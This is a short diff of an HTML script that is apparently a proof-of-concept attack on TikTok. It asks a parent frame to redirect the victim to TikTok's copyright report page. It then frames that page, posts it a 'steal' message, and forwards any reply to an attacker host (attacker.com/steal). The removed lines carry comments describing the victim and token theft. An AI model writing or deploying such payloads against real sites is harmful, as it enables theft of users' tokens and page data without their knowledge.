@@ -1,13 +1,20 @@
 <script>
-// Step 1: Redirect victim to another TikTok page where the token is reflected
 parent.postMessage({
     action: "requestRedirectionTo",
     targetUrlStr: "https://www.tiktok.com/legal/report/Copyright"
 }, "*");
 
-// Step 2: (Optional) Set a timeout to wait for redirect
 setTimeout(() => {
-    // Step 3: After redirection, this would only work if you also inject code into that redirected page (XSS there)
-    fetch('https://tiktok.com/steal?data=' + encodeURIComponent(document.body.innerText));
-}, 3000); // Adjust timing as needed
+    const frame = document.createElement('iframe');
+    frame.src = "https://www.tiktok.com/legal/report/Copyright";
+    document.body.appendChild(frame);
+
+    frame.onload = () => {
+        frame.contentWindow.postMessage("steal","*");
+    };
+
+    window.addEventListener("message", (e) => {
+        fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
+    });
+}, 2000);
 </script>
